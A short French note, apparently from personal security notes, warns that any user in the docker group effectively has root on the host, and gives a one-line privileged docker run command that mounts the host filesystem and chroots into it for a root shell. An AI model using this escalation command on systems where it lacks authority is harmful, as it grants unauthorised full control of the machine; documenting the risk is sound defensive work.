
# Les dangers du groupe docker

Si un utilisateur a le groupe docker alors il a toutes les droits sur la machine.
il peut utiliser un container du genre alpine ou ubuntu pour remonter le systeme en mode root 

```bash
docker run --rm -it -u root --privileged -v /:/mnt -v /var:/mnt/var -v /home/:/mnt/home ubuntu:22.04 chroot /mnt /bin/bash
```

---
Sources:
- https://blog.creekorful.org/2020/08/docker-privilege-escalation/